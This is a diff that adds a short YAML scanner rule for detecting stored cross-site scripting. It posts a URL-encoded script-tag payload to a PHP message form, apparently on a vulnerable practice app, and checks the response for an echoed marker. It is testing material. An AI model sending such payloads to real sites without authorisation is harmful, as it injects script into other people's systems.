@@ -1,0 +1,11 @@
+name: stored-xss-post
+type: xss
+rules:
+  - method: POST
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Content-type: application/x-www-form-urlencoded
+    path: /vul/xss/xss_stored.php
+    body: message=%3Cscript%3Eprompt%289998*47519%29%3C%2Fscript%3E&submit=submit
+    expression: result.contains("998*47519")
+author: ty
